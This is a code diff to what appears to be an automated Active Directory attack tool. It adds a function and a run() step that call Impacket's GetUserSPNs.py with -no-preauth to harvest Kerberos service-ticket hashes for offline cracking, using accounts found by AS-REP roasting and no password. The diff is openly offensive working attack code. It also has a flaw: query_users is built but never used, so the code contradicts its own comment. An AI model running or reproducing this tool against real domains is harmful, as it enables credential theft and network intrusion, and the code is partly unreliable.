@@ -547,6 +547,81 @@ def kerberoast(dc_ip: str, domain: str, credentials: list[dict]) -> list[str]:
     return hashes
 
 
+def kerberoast_no_preauth_subprocess(
+    dc_ip: str,
+    domain: str,
+    no_preauth_users: list[str],
+    script_path: str,
+) -> list[str]:
+    """
+    Use GetUserSPNs.py -no-preauth to request TGS tickets without any password.
+    Requires a user that has Kerberos pre-authentication disabled (found during
+    AS-REP roasting).  Combines AS-REP roasting + Kerberoasting in one step.
+
+    Impacket syntax (>= 0.10 / Kali standard):
+        GetUserSPNs.py -no-preauth <user> -usersfile <file> -dc-host <dc> domain.local/
+    """
+    hashes: list[str] = []
+
+    if not no_preauth_users or not script_path:
+        return hashes
+
+    # Write userlist for -usersfile (all domain users to query SPNs for)
+    with tempfile.NamedTemporaryFile(
+        mode="w", suffix=".txt", prefix="autopwn_spn_users_", delete=False
+    ) as uf:
+        uf.write("\n".join(no_preauth_users))
+        users_file = uf.name
+
+    out_file = f"/tmp/autopwn_nopreauth_tgs_{dc_ip.replace('.', '_')}.txt"
+    # Use the first no-preauth user as the unauthenticated identity
+    identity_user = no_preauth_users[0]
+
+    cmd = [
+        "python3", script_path,
+        f"{domain}/",
+        "-no-preauth", identity_user,
+        "-usersfile",  users_file,
+        "-dc-host",    dc_ip,
+        "-outputfile", out_file,
+        "-request",
+    ]
+
+    _log(f"  No-preauth Kerberoast (subprocess) -> GetUserSPNs.py -no-preauth {identity_user}@{domain}")
+    try:
+        proc = subprocess.run(
+            cmd,
+            capture_output=True,
+            text=True,
+            timeout=60,
+        )
+        _log(f"  GetUserSPNs.py -no-preauth exit={proc.returncode}")
+        if proc.stdout:
+            _log(f"  stdout: {proc.stdout[:300]}")
+    except subprocess.TimeoutExpired:
+        _log("  GetUserSPNs.py -no-preauth timed out after 60 s")
+    except FileNotFoundError as exc:
+        _log(f"  GetUserSPNs.py execution error: {exc}")
+    finally:
+        try:
+            os.unlink(users_file)
+        except OSError:
+            pass
+
+    if os.path.exists(out_file):
+        for line in pathlib.Path(out_file).read_text().splitlines():
+            line = line.strip()
+            if line.startswith("$krb5tgs$"):
+                hashes.append(line)
+        try:
+            os.unlink(out_file)
+        except OSError:
+            pass
+
+    _log(f"  No-preauth Kerberoast: {len(hashes)} TGS hashes recovered")
+    return hashes
+
+
 def kerberoast_subprocess(
     dc_ip: str,
     domain: str,
@@ -948,7 +1023,31 @@ def run() -> dict:
                     h for h in tgs_hashes if h not in all_kerberoast_hashes
                 )
             else:
-                _log("  No domain credentials available — skipping Kerberoast")
+                _log("  No domain credentials available — skipping authenticated Kerberoast")
+
+            # --- C2: No-preauth Kerberoasting (uses AS-REP users, no password) ---
+            # If AS-REP roasting found users with pre-auth disabled, use one of
+            # them as the unauthenticated identity to request TGS tickets for
+            # service accounts.  This combines both attacks without needing creds.
+            if all_asrep_hashes and _port_open(dc, 88):
+                get_spns = _find_impacket_script("GetUserSPNs.py")
+                if get_spns:
+                    # Extract usernames from recovered AS-REP hashes
+                    no_preauth_users = []
+                    for h in all_asrep_hashes:
+                        u, _ = _parse_hash_identity(h)
+                        if u and u != "unknown" and u not in no_preauth_users:
+                            no_preauth_users.append(u)
+
+                    if no_preauth_users:
+                        # Use all discovered usernames as the SPN query list too
+                        query_users = list(dict.fromkeys(all_users + no_preauth_users))
+                        np_tgs = kerberoast_no_preauth_subprocess(
+                            dc_ip, domain, no_preauth_users, get_spns
+                        )
+                        all_kerberoast_hashes.extend(
+                            h for h in np_tgs if h not in all_kerberoast_hashes
+                        )
         else:
             _log("  Neither port 88 nor 389 open — skipping Kerberoast")
 
